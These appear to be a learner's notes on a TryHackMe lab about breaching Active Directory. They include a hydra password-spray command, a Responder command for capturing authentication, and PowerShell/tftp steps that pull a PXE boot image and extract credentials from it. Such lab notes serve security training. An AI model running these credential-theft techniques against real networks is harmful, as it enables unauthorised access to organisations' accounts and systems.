https://tryhackme.com/room/breachingad

## Getting AD credentials:
-   NTLM Authenticated Services
-   LDAP Bind Credentials
-   Authentication Relays
-   Microsoft Deployment Toolkit
-   Configuration Files

## OSINT and Phishing
OSINT: https://tryhackme.com/room/redteamrecon
Phishing: https://tryhackme.com/module/phishing

## NTLM Authenticated Services
hydra -L usernames.txt -p Changeme123 http-get://ntlmauth.za.tryhackme.com

## LDAP Bind Credentials (LDAP Pass-back Attack)
tricking service to autheticate to our ldap server(port 389)
https://www.digitalreplica.org/articles/openldap-for-ldap-plain-text-password-capture/

## Authentication Relays
sudo responder -I INTERFACE

## Microsoft Deployment Toolkit
PXE Boot Image Retrieval
```powershell
tftp -i IP GET "\tmp\BCDFILE" conf.bcd
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
tftp -i IP GET "IMAGE_LOCATION" pxeboot.wim
Get-FindCredentials -WimFile pxeboot.wim
```

## Configuration Files
https://github.com/GhostPack/Seatbelt